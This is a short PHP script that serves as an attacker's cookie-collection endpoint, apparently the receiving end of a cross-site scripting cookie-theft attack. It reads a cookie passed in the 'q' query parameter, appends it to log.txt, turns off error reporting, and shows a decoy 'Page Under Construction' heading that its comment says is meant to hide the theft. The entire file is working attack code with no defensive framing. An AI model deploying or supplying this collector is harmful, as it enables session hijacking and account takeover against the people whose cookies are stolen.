<?php
error_reporting(0); # Turn off all error reporting
//header ('Location:https://google.com');
if(isset($_GET['q'])){
	$cookie=$_GET['q'];
	$fn="log.txt";   # The log file
	$fh=fopen($fn,'a');   # Open log file in append mode
	fwrite($fh,$cookie."\n"); # Append the cookie
	fclose($fh);  # close the file
}
echo '<h1>Page Under Construction</h1>'; # Trying to hide suspects…

?>

